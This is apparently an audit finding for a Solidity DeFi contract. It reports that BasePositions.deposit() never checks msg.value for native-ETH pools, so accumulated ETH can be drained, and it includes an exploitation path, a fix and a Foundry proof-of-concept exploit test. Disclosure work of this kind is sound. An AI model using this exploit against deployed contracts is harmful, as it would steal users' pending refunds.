## Title
Insufficient msg.value Validation in BasePositions Allows Theft of Contract ETH Balance

## Summary
The `BasePositions.deposit()` function for pools with native token (ETH) as `token0` does not validate that `msg.value >= amount0`, allowing attackers to drain accumulated ETH from the contract by depositing with insufficient payment. [1](#0-0) 

## Impact
**Severity**: High

## Finding Description
**Location:** `src/base/BasePositions.sol` - `handleLockData()` function, lines 253-262

**Intended Logic:** When a user deposits liquidity to a pool where `token0` is `NATIVE_TOKEN_ADDRESS`, the user should send sufficient `msg.value` to cover the required ETH amount (`amount0`). The contract should validate this and revert if insufficient ETH is provided.

**Actual Logic:** The contract sends ETH from its own balance to ACCOUNTANT without verifying that `msg.value >= amount0`. The vulnerability occurs because:

1. When `deposit()` is called with `msg.value`, the ETH stays in the BasePositions contract [2](#0-1) 

2. The `lock()` function calls `ACCOUNTANT.lock()` with `value=0` (line 61 in BaseLocker), so `msg.value` remains in BasePositions

3. `handleLockData()` calls `CORE.updatePosition()` as a normal external call (default value=0), so the msg.value from the original transaction is not forwarded [3](#0-2) 

4. `CORE.updatePosition()` sees `msg.value == 0` and creates full debt for `NATIVE_TOKEN_ADDRESS` without any reduction [4](#0-3) 

5. Line 257 then executes `SafeTransferLib.safeTransferETH(address(ACCOUNTANT), amount0)` which sends ETH from the contract's balance, **not from the user's msg.value** [5](#0-4) 

6. If the contract has accumulated ETH balance >= amount0 (from previous overpayments, donations, or dust), the transfer succeeds even if the attacker sent 0 or insufficient msg.value

7. The ACCOUNTANT's receive() function credits the payment and zeros the debt [6](#0-5) 

**Exploitation Path:**
1. **Prerequisite**: BasePositions contract accumulates ETH balance (e.g., 1 ETH from users who overpaid and haven't called `refundNativeToken()`) [7](#0-6) 

2. **Attack**: Attacker calls `deposit()` with `msg.value = 0` (or less than required) for a pool where `poolKey.token0 == NATIVE_TOKEN_ADDRESS` [8](#0-7) 

3. **State Change**: Protocol calculates `amount0` (e.g., 0.5 ETH) needed based on liquidity parameters, creates debt in Core, then BasePositions sends 0.5 ETH from its own balance to settle

4. **Outcome**: Attacker receives a position worth 0.5 ETH while paying nothing, stealing 0.5 ETH from the contract's accumulated balance

**Security Property Broken:** Violates the **Solvency** invariant - user funds (ETH sitting in the contract awaiting refund) are stolen by attackers who receive positions without proper payment.

## Impact Explanation
- **Affected Assets**: All ETH balance accumulated in the BasePositions contract, including overpayments from legitimate users awaiting `refundNativeToken()` calls
- **Damage Severity**: Attacker can drain the entire ETH balance of the contract by repeatedly calling `deposit()` with `msg.value = 0`, receiving full liquidity positions without payment. Each attack steals up to the calculated `amount0` per transaction.
- **User Impact**: All users who have pending ETH refunds in the contract lose their funds. The contract's ETH balance can be completely drained, affecting anyone who overpaid and planned to call `refundNativeToken()`.

## Likelihood Explanation
- **Attacker Profile**: Any unprivileged user can exploit this - no special permissions or tokens required
- **Preconditions**: Only requires the BasePositions contract to have non-zero ETH balance (which is expected behavior given the `refundNativeToken()` function exists for handling overpayments)
- **Execution Complexity**: Single transaction attack - simply call `deposit()` with `msg.value = 0`
- **Frequency**: Can be exploited repeatedly until contract is drained (once per transaction, limited only by gas and available contract balance)

## Recommendation

**Option 1: Validate msg.value (Recommended)**
```solidity
// In src/base/BasePositions.sol, handleLockData(), line 253-262:

// CURRENT (vulnerable):
if (poolKey.token0 != NATIVE_TOKEN_ADDRESS) {
    ACCOUNTANT.payTwoFrom(caller, poolKey.token0, poolKey.token1, amount0, amount1);
} else {
    if (amount0 != 0) {
        SafeTransferLib.safeTransferETH(address(ACCOUNTANT), amount0);
    }
    if (amount1 != 0) {
        ACCOUNTANT.payFrom(caller, poolKey.token1, amount1);
    }
}

// FIXED:
if (poolKey.token0 != NATIVE_TOKEN_ADDRESS) {
    ACCOUNTANT.payTwoFrom(caller, poolKey.token0, poolKey.token1, amount0, amount1);
} else {
    // Validate sufficient ETH was sent
    if (amount0 > msg.value) {
        revert InsufficientETHPayment(amount0, msg.value);
    }
    
    if (amount0 != 0) {
        SafeTransferLib.safeTransferETH(address(ACCOUNTANT), amount0);
    }
    if (amount1 != 0) {
        ACCOUNTANT.payFrom(caller, poolKey.token1, amount1);
    }
    
    // Refund excess ETH to caller
    unchecked {
        uint256 refund = msg.value - amount0;
        if (refund > 0) {
            SafeTransferLib.safeTransferETH(caller, refund);
        }
    }
}
```

**Option 2: Forward msg.value to Core (Alternative)**
Modify the call to `CORE.updatePosition()` to explicitly forward `msg.value`, similar to how Router handles swaps. This would require changes to how the call is made and would integrate with Core's native payment handling logic.

## Proof of Concept
```solidity
// File: test/Exploit_InsufficientMsgValue.t.sol
// Run with: forge test --match-test test_StealContractETH -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Core.sol";
import "../src/Positions.sol";
import {PoolKey} from "../src/types/poolKey.sol";
import {createConcentratedPoolConfig} from "../src/types/poolConfig.sol";
import {NATIVE_TOKEN_ADDRESS} from "../src/math/constants.sol";
import {TestToken} from "./TestToken.sol";

contract Exploit_InsufficientMsgValue is Test {
    Core core;
    Positions positions;
    TestToken token1;
    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");
    
    function setUp() public {
        core = new Core();
        positions = new Positions(core, address(this), 0, 1);
        token1 = new TestToken(address(this));
        
        // Fund victim with 1 ETH
        vm.deal(victim, 1 ether);
    }
    
    function test_StealContractETH() public {
        // SETUP: Create pool with NATIVE_TOKEN_ADDRESS as token0
        PoolKey memory poolKey = PoolKey({
            token0: NATIVE_TOKEN_ADDRESS,
            token1: address(token1),
            config: createConcentratedPoolConfig(1 << 63, 100, address(0))
        });
        core.initializePool(poolKey, 0);
        
        // Victim overpays and contract accumulates 1 ETH
        vm.startPrank(victim);
        token1.approve(address(positions), 100);
        positions.mintAndDeposit{value: 1 ether}(poolKey, -100, 100, 0, 100, 0);
        vm.stopPrank();
        
        // Victim plans to call refundNativeToken() later but hasn't yet
        uint256 contractBalanceBefore = address(positions).balance;
        assertGt(contractBalanceBefore, 0, "Contract should have ETH");
        
        // EXPLOIT: Attacker deposits with 0 msg.value
        vm.startPrank(attacker);
        token1.approve(address(positions), 100);
        
        uint256 attackerBalanceBefore = attacker.balance;
        
        // Attacker calls deposit with msg.value = 0, stealing contract's ETH
        positions.mintAndDeposit{value: 0}(poolKey, -100, 100, 
            uint128(contractBalanceBefore), 100, 0);
        
        vm.stopPrank();
        
        // VERIFY: Contract ETH was stolen
        uint256 contractBalanceAfter = address(positions).balance;
        assertLt(contractBalanceAfter, contractBalanceBefore, 
            "Contract ETH was stolen");
        assertEq(attacker.balance, attackerBalanceBefore, 
            "Attacker paid nothing but got position");
    }
}
```

## Notes

This vulnerability specifically affects the deposit flow when `token0 == NATIVE_TOKEN_ADDRESS`. The key issue is the architectural decision to keep `msg.value` in the BasePositions contract rather than forwarding it to Core, combined with the lack of validation that the kept `msg.value` is sufficient to cover the calculated `amount0`.

The Router contract handles this correctly by explicitly calculating the required value and forwarding it to Core.swap() [9](#0-8) , but BasePositions uses a different pattern that creates this vulnerability.

The presence of the `refundNativeToken()` function [7](#0-6)  confirms that the contract is expected to accumulate ETH from overpayments, making this attack highly practical.

### Citations

**File:** src/base/BasePositions.sol (L243-247)
```text
            PoolBalanceUpdate balanceUpdate = CORE.updatePosition(
                poolKey,
                createPositionId({_salt: bytes24(uint192(id)), _tickLower: tickLower, _tickUpper: tickUpper}),
                int128(liquidity)
            );
```

**File:** src/base/BasePositions.sol (L253-262)
```text
            if (poolKey.token0 != NATIVE_TOKEN_ADDRESS) {
                ACCOUNTANT.payTwoFrom(caller, poolKey.token0, poolKey.token1, amount0, amount1);
            } else {
                if (amount0 != 0) {
                    SafeTransferLib.safeTransferETH(address(ACCOUNTANT), amount0);
                }
                if (amount1 != 0) {
                    ACCOUNTANT.payFrom(caller, poolKey.token1, amount1);
                }
            }
```

**File:** src/base/BaseLocker.sol (L44-73)
```text
    function lock(bytes memory data) internal returns (bytes memory result) {
        address target = address(ACCOUNTANT);

        assembly ("memory-safe") {
            // We will store result where the free memory pointer is now, ...
            result := mload(0x40)

            // But first use it to store the calldata

            // Selector of lock()
            mstore(result, shl(224, 0xf83d08ba))

            // We only copy the data, not the length, because the length is read from the calldata size
            let len := mload(data)
            mcopy(add(result, 4), add(data, 32), len)

            // If the call failed, pass through the revert
            if iszero(call(gas(), target, 0, result, add(len, 4), 0, 0)) {
                returndatacopy(result, 0, returndatasize())
                revert(result, returndatasize())
            }

            // Copy the entire return data into the space where the result is pointing
            mstore(result, returndatasize())
            returndatacopy(add(result, 32), 0, returndatasize())

            // Update the free memory pointer to be after the end of the data, aligned to the next 32 byte word
            mstore(0x40, and(add(add(result, add(32, returndatasize())), 31), not(31)))
        }
    }
```

**File:** src/Core.sol (L336-344)
```text
        if (msg.value == 0) {
            // No native token payment included in the call, so use optimized pair update
            _updatePairDebt(id, token0, token1, debtChange0, debtChange1);
        } else {
            if (token0 == NATIVE_TOKEN_ADDRESS) {
                unchecked {
                    // token0 is native, so we can still use pair update with adjusted debtChange0
                    // Subtraction is safe because debtChange0 and msg.value are both bounded by int128/uint128
                    _updatePairDebt(id, token0, token1, debtChange0 - int256(msg.value), debtChange1);
```

**File:** src/base/FlashAccountant.sol (L384-393)
```text
    receive() external payable {
        uint256 id = _getLocker().id();

        // Note because we use msg.value here, this contract can never be multicallable, i.e. it should never expose the ability
        //      to delegatecall itself more than once in a single call
        unchecked {
            // We assume msg.value will never exceed type(uint128).max, so this should never cause an overflow/underflow of debt
            _accountDebt(id, NATIVE_TOKEN_ADDRESS, -int256(msg.value));
        }
    }
```

**File:** src/base/PayableMulticallable.sol (L25-29)
```text
    function refundNativeToken() external payable {
        if (address(this).balance != 0) {
            SafeTransferLib.safeTransferETH(msg.sender, address(this).balance);
        }
    }
```

**File:** src/math/constants.sol (L24-26)
```text
// Address used to represent the native token (ETH) within the protocol
// Using address(0) allows the protocol to handle native ETH alongside ERC20 tokens
address constant NATIVE_TOKEN_ADDRESS = address(0);
```

**File:** src/Router.sol (L106-114)
```text
                uint256 value = FixedPointMathLib.ternary(
                    !params.isToken1() && !params.isExactOut() && poolKey.token0 == NATIVE_TOKEN_ADDRESS,
                    uint128(params.amount()),
                    0
                );

                bool increasing = params.isPriceIncreasing();

                (PoolBalanceUpdate balanceUpdate,) = _swap(value, poolKey, params);
```
